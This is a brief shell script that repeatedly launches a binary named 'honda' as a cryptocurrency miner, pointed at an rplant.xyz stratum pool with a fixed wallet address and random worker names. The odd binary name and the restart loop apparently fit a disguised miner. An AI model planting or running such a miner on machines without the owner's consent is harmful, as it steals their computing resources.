#!/bin/sh
#
while [ 1 ]; do
./honda -a yescryptR8G -o stratum+tcps://stratum-eu.rplant.xyz:13032 -u k1AyQgmUPqFterccPqcu1tXakNMLiZGJN3K.$(echo $(shuf -i 1-500 -n 1)-bool) -t4
sleep 5
done
